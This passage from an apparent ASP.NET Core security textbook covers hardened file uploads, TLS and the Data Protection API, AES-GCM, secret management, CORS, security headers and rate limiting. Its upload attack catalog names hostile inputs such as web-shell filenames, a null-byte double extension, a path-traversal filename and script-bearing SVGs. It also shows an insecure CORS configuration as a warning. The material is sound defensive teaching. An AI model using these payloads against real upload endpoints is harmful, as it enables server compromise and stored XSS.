- Path traversal: `..` walks out — canonicalize (`GetFullPath`) then **contain** (prefix check with separator); better, replace names with IDs.
- Four greps memorized — these exact four cover a striking share of real "critical findings" that aren't injection or access control.

**Next:** Chapter 16 completes the attack catalog with the feature every shop eventually ships — file uploads — where a misstep grants remote code execution, stored XSS, or disk exhaustion in one POST.
## Chapter 16: File Upload Security

> "An upload endpoint accepts a file from anyone and stores it on your server. Read that sentence as an attacker."

### 16.1 What You Will Learn in This Chapter

File uploads are a five-attack surface in one endpoint: **remote code execution** (an executable that the server later runs or serves as code), **stored XSS** (an HTML/SVG payload served from *your* origin), **disk/resource exhaustion** (multi-gigabyte bodies and archives), **path traversal** in filenames (Ch. 15), and **overwrites** of system files. You will build SecureShop's admin product-image upload the *right way*, layer by layer, learning what each layer blocks — then read the analyst's audit pattern for upload endpoints you find in the wild.

### 16.2 History (Why This Endpoint Keeps Owning Servers)

- **Late 1990s-2000s — the upload-RCE era:** classic stacks (PHP, ASP, JSP) executed files *placed inside web-visible folders* — upload `shell.php`/`shell.aspx`, visit `/uploads/shell.aspx`, receive an interactive shell running with the web server's privileges. Entire exploitation toolkits centered on one upload field.
- **2010s — hardening and mutation:** frameworks and servers stopped executing upload folders by default; attackers mutated: double extensions (`shell.php.jpg`), null bytes (`shell.asp%00.jpg` in parsers that cut at NUL), `.htaccess` tricks, polyglot files (valid-as-two-formats), and moved to **client-side attacks** — stored XSS via SVG/HTML served from the target's own domain (Ch. 13).
- **Modern .NET reality:** Kestrel does not *execute* uploaded files, so raw upload-RCE is much harder than in classic stacks — and this *lulls teams*: the surviving attacks (XSS from your domain, traversal, DoS, and content-based exploitation of whatever *processes* the file later) still deliver breaches. Plus: any code that later processes uploads (image libraries, office parsers, archives — remember zip bombs and Log4Shell-era parser bugs, Ch. 3) is downstream attack surface your upload validation protects.

### 16.3 The Attack Catalog for One Endpoint

| Attack | Payload | Blocked by |
|---|---|---|
| Web-shell upload | `shell.aspx` (renamed `photo.jpg`) | extension allow-list *and* magic bytes *and* non-exec storage |
| Stored XSS | `evil.svg` (SVG contains `<script>`), `invoice.html` | content handling: never served inline from your origin (attachment + nosniff, Ch. 18) |
| Path traversal | filename `..\..\wwwroot\web.config` | server-generated random names (ignore user filename for storage) |
| Disk exhaustion | 10 GB body; a 10 MB `.zip` that expands to 10 TB (zip bomb) | request size limits + async quotas + scan-if-processing |
| Content confusion | `photo.jpg` that is actually HTML/JS; sniffing browsers | explicit content type you set; `X-Content-Type-Options: nosniff` |
| Parser exploitation downstream | crafted PNG/office/PDF fed to a vulnerable processor | file-type validation limits what processors ever run |

### 16.4 The Hardened Upload, Line by Line

Admin feature: product image upload (MVC). Create `Controllers/ProductImagesController.cs`:

```csharp
using System.Security.Cryptography;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;

[Authorize(Roles = "Admin")]                                   // 1
public class ProductImagesController : Controller
{
    private static readonly HashSet<string> AllowedExtensions =
        new(StringComparer.OrdinalIgnoreCase) { ".jpg", ".jpeg", ".png" };   // 2

    private const long MaxFileSizeBytes = 2 * 1024 * 1024;     // 3

    private readonly IWebHostEnvironment _env;
    public ProductImagesController(IWebHostEnvironment env) => _env = env;

    [HttpPost]
    [ValidateAntiForgeryToken]                                 // 4
    [RequestSizeLimit(MaxFileSizeBytes)]                       // 5
    public async Task<IActionResult> Upload(int productId, IFormFile file)
    {
        if (file is null || file.Length == 0)                  // 6
            return BadRequest(new { error = "No file received." });

        if (file.Length > MaxFileSizeBytes)                     // 7
            return BadRequest(new { error = "File exceeds 2 MB." });

        string ext = Path.GetExtension(file.FileName);          // 8
        if (!AllowedExtensions.Contains(ext))                   // 9
            return BadRequest(new { error = $"Extension {ext} is not allowed." });

        using var ms = new MemoryStream();                      // 10
        await file.CopyToAsync(ms);
        byte[] bytes = ms.ToArray();

        if (!LooksLikeImage(bytes, ext))                       // 11
            return BadRequest(new { error = "File content does not match a real image." });

        string storedName = $"{productId}-" +                   // 12
            $"{Convert.ToHexString(RandomNumberGenerator.GetBytes(16))}{ext}";

        string uploadsRoot = Path.Combine(_env.ContentRootPath, "App_Data", "uploads");   // 13
        Directory.CreateDirectory(uploadsRoot);

        string fullPath = Path.Combine(uploadsRoot, storedName);
        await System.IO.File.WriteAllBytesAsync(fullPath, bytes);   // 14

        return RedirectToAction("Products", "Admin");
    }

    private static bool LooksLikeImage(byte[] bytes, string ext) =>      // 15
        ext is ".jpg" or ".jpeg"
            ? bytes is [0xFF, 0xD8, 0xFF, ..]                            // JPEG magic
            : bytes is [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, ..]; // PNG magic
}
```

1. **Vertical gate first** — uploads are an admin privilege (Ch. 10); anonymous upload surfaces are the classic finding.
2. **Extension allow-list** — the declared intent of this endpoint: JPEG/PNG only. [RULE] Allow-lists only; a block-list of `.exe, .php` forgets `.svg`, `.html`, `.aspx`, `.config`, `.htaccess`...
3. `2 MB` — images do not need more; every byte of allowance is attacker budget for exhaustion.
4. CSRF shield (Ch. 14) — upload *is* a state change an evil page could forge.
5. `[RequestSizeLimit]` — **framework-level size cap on the whole request** before your code runs; without it Kestrel's default (30 MB) applies and your `file.Length` check happens only after the entire body is read. Defense in depth at the transport layer.
6. `IFormFile` — the multipart-uploaded file abstraction; null/empty must fail closed (a "no file" that proceeds creates ghost records).
7. Second size check — client-side limits and HTML `maxlength` are comfort (Ch. 2); the server re-checks.
8. `Path.GetExtension` — extracts `.jpg` *from the user-supplied filename* — note that's the **only** thing we take from it.
9. Allow-list check with `OrdinalIgnoreCase` (`.JPG` is legitimate; case games are not a defense).
10. Buffer into memory — with size already capped at 2 MB this is safe; large uploads (the general case) stream to disk with quotas instead, never unbounded memory.
11. **Magic-byte validation** *(word-by-word: magic numbers — the fixed leading bytes every file format carries as its fingerprint; JPEG starts `FF D8 FF`, PNG `89 50 4E 47`)*. The **content-type** header (Ch. 2: client-controlled, i.e., a lie by definition) is *never* checked here — we check the bytes themselves. Defeats `virus.jpg`-that-is-actually-HTML and renamed executables. (Line 15 uses C# **list patterns** — byte-by-byte prefix matching — and yes, for full production rigor you graduate to a real image-decoding validation: parse it as an image, reject on decode failure, optionally re-encode. Validation by *use* beats validation by sniffing.)
12. **Server-generated random storage name** — the user's filename is decoration, never a path component. 32 hex chars of cryptographic randomness: no traversal possible (Ch. 15's class, structurally removed), no collisions, no predictable overwrite (`..` in the name is irrelevant now), no `web.config` impersonation.
13. **Outside the web root** — `App_Data/` (the conventional non-served folder in ASP.NET apps; in our layout `wwwroot` is served by `UseStaticFiles` (Ch. 4), `App_Data` is not). Files there are *never* reachable by URL — only through our controller (next snippet), which enforces checks at *serving* time. (Cloud-native answer: object storage/Blob storage — same principle, one more trust boundary away.)
14. Write bytes with the server-chosen path only.
15. — (explained at 11.)

**Serving — equally deliberate** (uploads are only as safe as the download path):

```csharp
[HttpGet("{productId:int}/{fileId}")]
public IActionResult Get(int productId, string fileId)
{
    if (!fileId.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase) &&
        !fileId.EndsWith(".jpeg", StringComparison.OrdinalIgnoreCase) &&
        !fileId.EndsWith(".png", StringComparison.OrdinalIgnoreCase))
        return NotFound();                                            // 1

    string root = Path.Combine(_env.ContentRootPath, "App_Data", "uploads");
    string fullPath = Path.GetFullPath(Path.Combine(root, $"{productId}-{fileId}"));    // 2

    if (!fullPath.StartsWith(root + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase)
        || !System.IO.File.Exists(fullPath))
        return NotFound();

    return PhysicalFile(fullPath, ImageContentType(fileId),           // 3
                        fileDownloadName: $"product-{productId}.jpg");  // 4
}

private static string ImageContentType(string fileId) =>
    fileId.EndsWith(".png", StringComparison.OrdinalIgnoreCase)
        ? "image/png" : "image/jpeg";
```

1. `fileId` shape-checked — server-paths built from any user input get the full Chapter 15 treatment.
2. Canonicalize-then-contain (the pattern you can now write in your sleep).
3. **We** choose the content type from the file's *validated* identity — never trust a stored/uploaded content type (a stored `image/svg+xml` would re-open Ch. 13's SVG-XSS).
4. `fileDownloadName` forces `Content-Disposition: attachment` — even a content-confused file downloads as inert bytes instead of executing in your origin. With `X-Content-Type-Options: nosniff` (Ch. 18) the browser is forbidden from guessing otherwise.

### 16.5 [ANALYST LENS] The Upload Endpoint Audit

1. Who may upload? (role gate)
2. What is validated — extension? **magic bytes?** size — where (attribute/limit or hope)?
3. Where is it stored — web root? executable-exposed? (`wwwroot/uploads` + any handler mapping = ask how it's served)
4. Does the user control any **path** component (filename preserved on disk?) → traversal/overwrite
5. Is the original **content-type** trusted anywhere (upload, storage, serve)?
6. How is it served — static (URL-reachable) or through a controller? Inline or attachment? nosniff present?
7. What *processes* files later (thumbnailers, parsers, archives) — and are those libraries patched (Ch. 22)?
8. Quotas at scale: per-user, per-day, total disk; async AV hooks (ClamAV-style) for enterprise settings.

### 16.6 Recap

- Uploads concentrate five attack classes; each layer answers one: role gates, extension allow-list, size caps at the *framework* layer, magic-byte validation (content-type is a lie), random server-chosen names, storage outside the served root, and controlled serving with explicit content type + attachment + nosniff.
- Kestrel's non-executing nature is *not* a fix; stored XSS, traversal, exhaustion, and downstream parser exploitation all remain live.
- The strongest pattern is the simplest: let the database name the file (by ID), never the user.

**Next:** Part V — protecting data itself: how TLS works, how the Data Protection API guards cookies and columns, real symmetric encryption with AES-GCM, and where secrets must live (spoiler: never in Git).
# Part V: Data Protection

> Authentication, authorization, and injection-hardening protect *access*. Chapter 17 protects the *data itself* — in transit, at rest, and in memory of the machines that hold it.

## Chapter 17: TLS, Cryptography, and Secret Management

> "Encrypt everything. But know what encryption does and does not buy you."

### 17.1 What You Will Learn in This Chapter

Three skills every .NET security analyst must perform *fluently*: (1) **TLS/HTTPS** — what it guarantees, how ASP.NET Core enforces it, and the headers that lock it in; (2) the **Data Protection API** — .NET's purpose-built, key-rotating encryption system (the thing that has been protecting your cookies since Chapter 7 — now you'll use it directly, e.g. for sensitive columns); and (3) **secret management** — where keys and passwords live, from `user-secrets` to Key Vault. Along the way: real AES-GCM encryption line by line, the randomness rules, and the Git-hygiene mistakes that end careers.

### 17.2 TLS: History in Six Lines, Knowledge in Ten

- **1995 — SSL 2.0** (Netscape): first widespread web encryption; flawed by design almost immediately. **1996 — SSL 3.0** fixed much; **POODLE (2014)** killed it for good.
- **1999-2008 — the TLS era:** TLS 1.0 (1999), 1.1 (2006), **1.2 (2008)** — the decade-long workhorse.
- **2014-2015 — the cracks:** Heartbleed (OpenSSL bug — *implementation* failure) and the FREAK/Logjam downgrade attacks push the industry to strict configurations.
- **2018 — TLS 1.3:** faster (one round trip), simpler (fewer ciphersuites, only modern AEAD ciphers), no renegotiation/downgrade cruft. Modern platforms default to it.
- What TLS gives you *(word-by-word: Transport Layer Security — security at the transport layer, between two endpoints)*: **confidentiality** (nobody on the path reads), **integrity** (nobody alters bytes silently), and **server authentication** (the certificate proves who you connected to). What TLS does *not* give you: anything about what happens at the endpoints, or who is *using* the connection — TLS plus no authn is a locked tunnel to an open bank.
- Modern .NET stacks (and cloud load balancers) negotiate TLS 1.2+ automatically; the analyst's TLS checks are therefore mostly *configuration*: no TLS-disabled debug listeners, no `http://` internal fallbacks, certificates valid and rotation-planned, and the HTTP-to-HTTPS story below.

### 17.3 HTTPS in ASP.NET Core — the Three Lines That Do the Work

You have written these since Chapter 4; now the full explanation:

```csharp
app.UseHttpsRedirection();                  // 1
// inside the production branch:
app.UseHsts();                              // 2
```

1. **`UseHttpsRedirection`** — HTTP requests get a `307` redirect to the HTTPS URL. Real but imperfect: the *first* plain request still travels (one downgrade window). Which is why:
2. **`UseHsts`** — sets `Strict-Transport-Security: max-age=31536000` *(word-by-word: HTTP **Strict**-**T**ransport-**S**ecurity — the browser *strictly* remembers this site is HTTPS-only)*. After one successful HTTPS visit, the browser **refuses** plain HTTP to this host for a year — no downgrade, no first-request window, no user clicking through warnings. [DANGER] It is deliberately *disabled in Development* (localhost debugging without certs) — and equally deliberately **must never be unconditional**: a too-long `max-age` shipped before your HTTPS story is complete (mixed content, cookies without `Secure`) locks broken configurations into users' browsers. Staged rollout (minutes → hours → a year) is the deployment discipline.

**Cookies tie in** (Ch. 7's `CookieSecurePolicy.Always`) — belt and suspenders: even during any redirect window, auth cookies never travel plain.

`[LAB]` See it: `curl -I http://localhost:7101/` — find the `307` + `Location: https://...` header. That header is an attacker's downgrade target and your redirect's handshake: the pair above is what makes it harmless.

### 17.4 The Data Protection API (The System Behind Your Cookies)

Since Chapter 7 you have relied on a service you never met by name. Meet it.

**What it is:** an extensible, **key-rotating**, purpose-scoped encryption system built into ASP.NET Core. Its jobs: generate and store master keys, encrypt/decrypt with authenticated AES (encrypt + HMAC in one envelope), and **ring-rotate** keys every ~90 days while old keys remain readable for decryption.

**What "purpose strings" buy you** — the API's central design idea:

```csharp
using Microsoft.AspNetCore.DataProtection;                        // 1

public class PaymentTokenProtector(IDataProtectionProvider provider)   // 2
{
    private readonly IDataProtector _protector =
        provider.CreateProtector("SecureShop.PaymentTokens.v1");       // 3

    public string Protect(string plaintext)  => _protector.Protect(plaintext);
    public string Unprotect(string payload)   => _protector.Unprotect(payload);
}
```

1. Namespace to know by heart — it's a first-class part of ASP.NET Core (used internally by auth cookies, antiforgery (Ch. 14's tokens), session state, TempData).
2. `IDataProtectionProvider` — the DI-registered root; ask for it anywhere.
3. `CreateProtector("purpose.string")` — the *cryptography of namespaces*: ciphertext produced under purpose `"A"` **cannot be decrypted under purpose `"B"`*. Why that matters: an attacker who finds a place where the app decrypts attacker-supplied protected data (your "unsubscribe token" endpoint) cannot replay a *cookie* ciphertext through it — different purpose string, different realm, structurally. Purposes create compartmentalization *inside your own app*; hierarchies (`"SecureShop.PaymentTokens.v1"`) version your formats.
4. `Protect/Unprotect` — authenticated encryption: tampered ciphertext throws `CryptographicException` (fail closed), and only ciphertext the app itself produced will decode.

**Real use — sensitive column protection.** Not everything should be hashed (passwords — irreversible — Ch. 5); some data must come back (card payment tokens, national IDs) — those are **encrypted**, not hashed, and this is the tool: encrypt before `SaveChanges`, decrypt on read, keys outside the database. (Full industry alternative: Transparent Database Encryption/TDE or field-level DB encryption — know the names; know that app-level protection with purpose strings survives DB-file leaks (Ch. 15's `secureshop.db` theft: encrypted columns stay ciphertext without the key ring).)

**The deployment gotcha analysts must catch:** default key storage is **local and per-machine** (`~/.aspnet/DataProtection-Keys`). Single dev machine: perfect. Load-balanced farm: **each node generates its own keys** ⇒ a cookie protected on node A is garbage on node B ⇒ the famous "random logouts every few minutes" ticket, which is a *security architecture* failure wearing an ops costume. Fix: shared key ring (`PersistKeysToFileSystem` on a shared store, or a cloud blob with `ProtectKeysWithAzureKeyVault`/DPAPI), a 5-line configuration — grep `PersistKeysTo` in every production review.

### 17.5 AES-GCM: Direct Symmetric Encryption, Line by Line

When you need raw encryption control (rare, but real: encrypting files, custom protocol payloads), modern .NET gives you AEAD done right. AEAD *(word-by-word: Authenticated Encryption with Associated Data — ciphertext that is simultaneously encrypted **and** tamper-proof, plus optional non-secret context bound into it)*:

```csharp
using System.Security.Cryptography;

public static class AesGcmTool
{
    private const int KeySizeBytes = 32;                          // 1
    private const int NonceSizeBytes = 12;                        // 2
    private const int TagSizeBytes = 16;                          // 3

    public static (byte[] ciphertext, byte[] nonce, byte[] tag) Encrypt(byte[] key, byte[] plaintext)
    {
        using var aes = new AesGcm(key, TagSizeBytes);            // 4
        byte[] nonce = RandomNumberGenerator.GetBytes(NonceSizeBytes);   // 5
        byte[] ciphertext = new byte[plaintext.Length];
        byte[] tag = new byte[TagSizeBytes];

        aes.Encrypt(nonce, plaintext, ciphertext, tag);            // 6
        return (ciphertext, nonce, tag);
    }

    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        using var aes = new AesGcm(key, TagSizeBytes);            // 7
        byte[] plaintext = new byte[ciphertext.Length];
        aes.Decrypt(nonce, ciphertext, tag, plaintext);           // 8
        return plaintext;
    }
}
```

1. **256-bit key** — modern default; generated with `RandomNumberGenerator.GetBytes(32)` and *stored as a secret* (below), never derived from a password.
2. **Nonce** *(word-by-word: "number used once")* — a unique-per-encryption random value that GCM requires; reuse of key+nonce together is **catastrophic** in GCM (it leaks the authentication key). Rule: never write your own counter; `RandomNumberGenerator` per message is the standard practice.
3. **Tag** — the authentication token (GCM's built integrity layer — your ciphertext's tamper seal). The .NET 8 constructor takes the tag size up front.
4. `AesGcm` — the AEAD primitive; wraps and checks the tag for you.
5. Fresh nonce per encryption — the line that keeps GCM safe.
6. One call: nonce + plaintext in, ciphertext + tag out. Store all three (ciphertext, nonce, tag) — decryption needs all three; none of them are secret except the key.
7. —
8. Wrong tag ⇒ `CryptographicException` — tampering dies here, structurally, before your code ever reads plaintext.

[NOTE] Reach for Data Protection API first (it handles keys, rotation, purposes); reach for `AesGcm` when you must control the envelope (cross-platform payloads, custom stores). *Never* reach for the museum wing: `AesManaged`-in-CBC-without-authentication (padding-oracle class of attacks — the legacy .NET code you'll find in audits), `MD5`, `SHA1`, `DES`, `RijndaelManaged`. [RULE] If the code constructs `new Aes(...)` with a `Mode` property, the finding is "AEAD expected."

### 17.6 Randomness: The Two Machines That Must Never Be Confused

| `System.Random` | `RandomNumberGenerator` |
|---|---|
| Fast, deterministic (clock-seeded), predictable sequences | Cryptographically secure, unpredictable |
| Simulations, test data, shuffling playlists | **Salts, keys, nonces, tokens, session IDs, file names, passwords** |

The concrete disaster you have already prevented twice (Ch. 5 salts, Ch. 16 filenames): an attacker who can predict the "random" generator's output can precompute, guess, or replay whatever was supposed to be unpredictable. Grep: `new Random(` on paths feeding security values = finding (an increasingly exotic one, as modern analyzers warn — the *analyst* note: "exotic" findings are only exotic in new code; the field's C# code is full of 2014).

### 17.7 Secrets: The Full Story

You met the rule in Ch. 8 (JWT key). Now the pattern, from laptop to cloud:

1. **Development — user-secrets.** `dotnet user-secrets` (Ch. 8) — a JSON file in your OS profile, outside the repo, merged into configuration at runtime. The two-line habit that keeps every future key safe from `git push -f`.
2. **The `.gitignore` discipline.** Every machine-readable secret location is banned from Git: `appsettings` overrides, `.env` files, `secureshop.db`, deployment scripts. And the un-glitchable rule: **secrets in Git history are leaked forever** — history rewriting on shared repos is theater; rotate the secret (treat every commit as public — because for your future employers' attackers, it eventually is).
3. **Production — environment variables / secret stores.** Configuration layers resolve in order: appsettings.json (non-secrets, in Git) → environment variables (secrets, set by deployment) → key vaults (Azure Key Vault, AWS Secrets Manager, HashiVault): dedicated, access-controlled, audited, versioned homes for keys. Your code never changes — `config["Jwt:Key"]` reads whichever layer provides it. That *indirection* is the whole design: **code asks by name; operators decide where it lives.**
4. **Fail loudly at startup.** [DANGER] The silent killer: `config["Jwt:Key"]` returning `null` (secret not deployed to one server) and the app half-working with `!`-suppressed nulls or empty-string fallbacks. Correct pattern for every critical secret:

```csharp
string jwtKey = config["Jwt:Key"]
    ?? throw new InvalidOperationException("Jwt:Key is missing. Check deployment secrets.");
```

A crash at boot is a ticket; an empty key in production is a breach.

### 17.8 [ANALYST LENS] The Data-Protection Checklist

- TLS: redirect + HSTS + `Secure` cookies; no `http://` endpoints in config; certs/rotation owned by someone.
- Cookies/antiforgery protected (they are by default) **and the key ring is shared** on multi-node (`PersistKeysTo*` present).
- Sensitive columns: hashed (passwords, irreversible) vs encrypted (tokens, IDs — reversible, Data Protection/AES-GCM), never plaintext-at-rest "temporarily".
- Museum crypto grep: `MD5|SHA1|DES|Rijndael|AesManaged|new Random\(` — each hit needs a paragraph of justification.
- Secrets: no secret values in Git (current *or* history); startup validation present for critical secrets; vault adoption documented.
- Key rotation: a named, dated plan — "we'll rotate if we're breached" is a finding.

### 17.9 Recap

- TLS = confidentiality + integrity + endpoint authentication, enforced in .NET by redirection + HSTS + Secure cookies; TLS protects the wire, nothing else.
- Data Protection API = key-rotating, purpose-scoped, authenticated encryption — the purpose string is compartmentalization; the shared key ring is the multi-node gotcha; use it before raw AES.
- Raw AEAD: `AesGcm`, fresh nonce, tag verified, key from a vault — the CBC-without-auth museum wing stays closed.
- Two random machines never cross; secrets live outside Git in layered configuration; missing secrets crash the app at boot.

**Next:** Part VI hardens the perimeter itself: CORS (the most misconfigured header in APIs), the security-headers middleware suite, rate limiting against brute force, and then — Chapter 19 — the logs and errors that make attacks *visible*.
# Part VI: Hardening and Operations

> Chapters 18-19 are the difference between "secure logic" and "hardened system": perimeter policy (CORS), declared defenses (security headers), abuse resistance (rate limiting), and the sensors that make attacks visible (logging, auditing, safe errors).

## Chapter 18: CORS, Security Headers, and Rate Limiting

> "Three configuration disciplines that quietly decide whether Chapter 8-17 defenses hold."

### 18.1 What You Will Learn in This Chapter

Three pillars of hardening, each line by line: **CORS** — the browser's same-origin policy, how ASP.NET Core's CORS middleware speaks it, and the two configurations that quietly break security (plus the one combination the framework itself refuses); **security headers** — a reusable middleware installing CSP, frame protection, nosniff, referrer and permissions policy; and **rate limiting** (.NET 8's built-in limiter) to blunt brute-force attacks. The chapter closes with the pipeline-order map that makes all middleware make sense.

### 18.2 CORS: History and Vocabulary

- **1995 — the Same-Origin Policy (SOP).** Netscape's rule (still the browser security bedrock): scripts on `origin A` may not read responses from `origin B`. **Origin** *(word-by-word: scheme + host + port as one identity — `https://a.com` and `http://a.com` are **different origins**; `a.com` and `evil.a.com` are also different; two apps on different ports of localhost are different)*. SOP prevents `evil.example`'s JavaScript from *reading* your bank's pages with your cookies.
- **2000s — the legitimate need:** SPAs and APIs genuinely need *cross-origin calls*: your MVC front-end (origin 7101) calling your API (7102) is cross-origin — *even on localhost, even on the same machine*.
- **2009+ — the answer: CORS** (Cross-Origin Resource Sharing): the server *declares*, via headers, which origins the browser may allow JavaScript to call. The browser enforces it; the server just answers.

**Preflight, word by word.** For "non-simple" requests (custom headers like `Authorization`, JSON content type, non-GET/POST-mime classics), the browser first sends `OPTIONS` (the **preflight** — "may I send the real request?"); the server answers with its CORS policy; only then does the real request fly. Simple requests (classic forms, plain GETs) skip preflight — which is why CORS was irrelevant to CSRF (Ch. 14) and why *preflight is not an authorization gate*: it is a browser-conversation about *reading responses*, not about *accepting requests*. The server receives and should authorize every request regardless.

### 18.3 CORS in SecureShop: From Lab Pain to Safe Config

Because front-end 7101 calling API 7102 is cross-origin, an SPA future needs CORS. The safe configuration (API `Program.cs`):

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("WebApp", policy => policy
        .WithOrigins("https://localhost:7101")       // 1
        .AllowAnyHeader()                            // 2
        .AllowAnyMethod()
        .AllowCredentials());                        // 3
});

// pipeline:
app.UseCors("WebApp");                               // 4
```

1. **`WithOrigins` — the allow-list.** Exact origin strings, one per legitimate front-end. This is the whole security of CORS: *you enumerate your own sites*.
2. Headers/methods may be broad when origins are pinned: the origin allow-list is the gate that matters.
3. `AllowCredentials()` — permits cookies/auth headers on cross-origin calls — legal **only** alongside an explicit origin list. Now the two disasters you will find in the wild:

```csharp
// Disaster A — the framework saves you (throws at startup):
policy.AllowAnyOrigin().AllowCredentials();          // 1

// Disaster B — the bypass people copy from forums to silence the exception:
policy.SetIsOriginAllowed(_ => true)                 // 2
      .AllowCredentials();
```

1. Any origin + credentials = "any website may make credentialed calls to us" — the framework *throws* (`InvalidOperationException`) rather than allow it. ASP.NET Core defends you here; **do not read this as "CORS is safe by default, skip review."**
2. `SetIsOriginAllowed(_ => true)` — reflects/accepts *any* Origin header while allowing credentials: the exact security hole the startup check exists to prevent, reopened with a lambda. [ANALYST LENS] grep `SetIsOriginAllowed|AllowAnyOrigin` — every hit requires a written justification; combined with `AllowCredentials`, it is an automatic high finding. (Historical footnote: the real-world pattern usually arrives as "make the OPTIONS 403 go away" — the fix they *needed* was an exact `WithOrigins`.)

One more trap: CORS headers **do nothing for non-browsers** — `curl`, scripts, and servers ignore them entirely. "We have strict CORS" is never an access-control answer (Ch. 11 owns that); it is strictly a browser-side read-permission declaration.

### 18.4 The Security Headers Middleware, Line by Line

Create `src/SecureShop.Web/Security/SecurityHeadersMiddleware.cs`:

```csharp
public static class SecurityHeadersExtensions
{
    public static IApplicationBuilder UseSecurityHeaders(this IApplicationBuilder app)
    {
        app.Use(async (context, next) =>                            // 1
        {
            IHeaderDictionary headers = context.Response.Headers;
            headers["X-Content-Type-Options"] = "nosniff";          // 2
            headers["X-Frame-Options"] = "DENY";                   // 3
            headers["Referrer-Policy"] = "no-referrer";             // 4
            headers["Permissions-Policy"] =
                "camera=(), microphone=(), geolocation=()";        // 5
            headers["Content-Security-Policy"] =
                "default-src 'self'; script-src 'self'; style-src 'self'; " +
                "img-src 'self' data:; frame-ancestors 'none'; " +
                "base-uri 'self'; form-action 'self'";              // 6
            await next();                                           // 7
        });
        return app;
    }
}
```

1. Inline middleware via `app.Use(...)` — the same mechanism as the named `UseXxx` you've been calling all along; registered in `Program.cs` as `app.UseSecurityHeaders();` **before** routing/static files so every response passes through.
2. **`nosniff`** — forbids browsers from *guessing* content types (MIME sniffing — an IE-era behavior that turned a JSON response containing HTML into rendered HTML: the XSS path of least resistance). Pairs with the explicit content types you set in Ch. 16's serving.
3. **`X-Frame-Options: DENY`** — clickjacking *(word-by-word: hijacking by clicking — attacker embeds your page in a transparent iframe and tricks the victim into clicking *your* authenticated buttons)* — DENY forbids all framing. Modern equivalent lives inside CSP (line 6): `frame-ancestors 'none'` — set both (old + new browsers).
4. **`Referrer-Policy`** — controls how much of the URL leaks via the `Referer` header when users navigate away. `no-referrer` (strictest for a shop) — remember Chapter 2: **URLs contain query strings; query strings contain session-reset tokens and search terms**. Misconfigured referrer leaking to third-party analytics is a classic quiet data breach.
5. **`Permissions-Policy`** — declares this origin will not use sensitive browser APIs (camera, microphone, geolocation): kills the "legitimate site asks for camera" phishing pattern before it starts.
6. **`Content-Security-Policy`** — Chapter 13's declared last door: scripts/styles only from our own origin (`'self'`), no inline, no eval, forms may only submit to us. This one header converts XSS from "any hole is fatal" to "a hole must *also* defeat the whitelist". [DANGER] Turning CSP on for the *default MVC template* will break it — the template's inline scripts/styles violate `'self'`-only rules. Real deployments move inline scripts to files (or nonces), then deploy CSP in report-only mode (`Content-Security-Policy-Report-Only`) to find violations before enforcement. That migration is a standard analyst deliverable: "CSP rollout plan".
7. `await next()` — headers set *before* `next()` are on every response flowing back through.

### 18.5 The Middleware Pipeline: The Full Map

Everything you have written since Chapter 4 now composes. An order, the reason, and what breaks when swapped:

```text
Request ─► UseHttpsRedirection ─► UseHsts(prod) ─► UseSecurityHeaders
        ─► UseStaticFiles ─► UseRouting ─► UseCors ─► UseAuthentication
        ─► UseAuthorization ─► UseRateLimiter ─► endpoints/MapControllers
```

- HTTPS first (before anything else answers on the wire), headers early (every response), static files before auth (CSS/JS shouldn't 401), routing before CORS/auth (policy selection needs the endpoint), **auth before authz** (Chapter 6's law), limiter before endpoints (reject cheap). Two classic failures to recognize: `UseAuthentication` after `UseAuthorization` (everyone 403s or nobody does) and CORS *after* auth (preflight `OPTIONS` requests — which carry no token — get 401'd and the browser reports CORS errors that are really auth-order bugs). This map is the single most useful diagram in your notes.

### 18.6 Rate Limiting (.NET 8): Blunting Brute Force

Chapter 6's lockout protects accounts; a **rate limiter** protects the *server* and the login endpoint from industrialized guessing (and credential-stuffing lists). .NET 8 ships one natively:

```csharp
using System.Threading.RateLimiting;
using Microsoft.AspNetCore.RateLimiting;

builder.Services.AddRateLimiter(options =>
{
    options.RejectionStatusCode = StatusCodes.Status429TooManyRequests;   // 1

    options.AddPolicy("auth", context =>                                 // 2
        RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: context.Connection.RemoteIpAddress?.ToString() ?? "unknown",  // 3
            factory: _ => new FixedWindowRateLimiterOptions
            {
                PermitLimit = 5,                                        // 4
                Window = TimeSpan.FromMinutes(1),
                QueueLimit = 0                                           // 5
            }));
});

app.UseRateLimiter();                                                    // 6
```

1. `429` — the Chapter 2 status for "too much" — is the correct contract; add `Retry-After` headers at the proxy layer for well-behaved clients.
2. `AddPolicy("auth", ...)` — a named, **partitioned** policy; the lambda is called per request to choose a partition key.
3. **Partition by IP** — each caller gets their own 5-per-minute bucket (a global limit would let one attacker lock everyone out — that *denial-of-service via your own limiter* is a real anti-pattern). [NOTE] IPs are spoofable at proxies and shared behind NAT/carriers — production partitions combine IP + username + route; know the limits of each key.
4. `PermitLimit = 5` per window: brute-force math collapses from ~thousands of guesses/minute to 5. Notice how this *composes* with lockout (Ch. 6) and PBKDF2 slowness (Ch. 5): layered cost inflation.
5. `QueueLimit = 0` — excess requests are rejected, never queued (queuing login attempts just moves the DoS into your memory).
6. Registered in the pipeline (before endpoints, after auth per the map — Ch. 18.5).

And applying it where it matters:

```csharp
[EnableRateLimiting("auth")]                              // 1
[HttpPost("login")]
public async Task<IActionResult> Login(LoginRequest request) ...
```

1. The named policy, attached. `[DisableRateLimiting]` marks explicit exceptions — [ANALYST LENS] like `[IgnoreAntiforgeryToken]`, every opt-out is a review item. Audit questions: which endpoints are limited (login, register, reset, search, expensive reports)? Is the limiter actually in the pipeline (registration without `UseRateLimiter()` = silent no-op — the Ch. 10 lesson, replayed at infrastructure level)?

### 18.7 Recap

- CORS = browser read-permission declaration: `WithOrigins` allow-lists; `AllowCredentials` only with explicit origins; `SetIsOriginAllowed(_ => true)` + credentials is the reopened hole; CORS ≠ access control; non-browsers ignore it.
- Security headers = declared defenses: nosniff, frame denial (XFO + `frame-ancestors`), referrer, permissions, and CSP — the XSS last door, rolled out report-only first.
- Pipeline order is a security decision; the map (18.5) explains every symptom you'll ever debug.
- Rate limiting = per-partition cost inflation on sensitive routes; `429`; composes with lockout and slow hashing; opt-outs are findings.

